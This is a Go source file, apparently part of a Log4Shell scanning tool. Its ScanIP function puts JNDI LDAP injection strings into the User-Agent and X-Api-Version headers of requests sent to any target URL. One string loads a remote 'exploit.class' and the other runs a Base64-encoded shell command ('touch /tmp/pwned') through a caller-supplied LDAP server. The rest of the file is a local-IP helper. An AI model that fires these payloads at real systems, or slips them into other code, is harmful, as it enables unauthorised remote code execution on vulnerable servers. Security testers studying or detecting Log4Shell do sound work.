package cmd

import (
	"fmt"
	"github.com/pterm/pterm"
	log "github.com/sirupsen/logrus"
	"net"
	"net/http"
	"strings"
	"sync"
	"time"
)

func ScanIP(targetUrl string, serverUrl string, wg *sync.WaitGroup) {
	client := &http.Client{
		Timeout: 3 * time.Second,
		Transport: &http.Transport{
			TLSHandshakeTimeout:   1 * time.Second,
			ResponseHeaderTimeout: 1 * time.Second,
			ExpectContinueTimeout: 1 * time.Second,
		},
	}
	targetUserAgent := fmt.Sprintf("${jndi:ldap://%s/exploit.class}", serverUrl)
	targetHeader := fmt.Sprintf("${jndi:ldap://%s/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}", serverUrl)
	log.Debugf("Target URL: %s", targetUrl)
	//log.Debugf("Target User-Agent: %s", targetUserAgent)
	//log.Debugf("Target X-Api-Version: %s", targetHeader)
	request, err := http.NewRequest("GET", targetUrl, nil)
	if err != nil {
		pterm.Error.Println(err)
		log.Fatal(err)
	}
	request.Header.Set("User-Agent", targetUserAgent)
	request.Header.Add("X-Api-Version", targetHeader)
	response, err := client.Do(request)
	if err != nil && !strings.Contains(err.Error(), "Client.Timeout") {
		log.Debug(err)
	}
	if response != nil {
		msg := fmt.Sprintf("We got a response, %s ==> Status code: %d", targetUrl, response.StatusCode)
		log.Infof(msg)
		pterm.Info.Println(msg)
	}
	wg.Done()
}

// GetLocalIP returns the non loopback local IP of the host
func GetLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
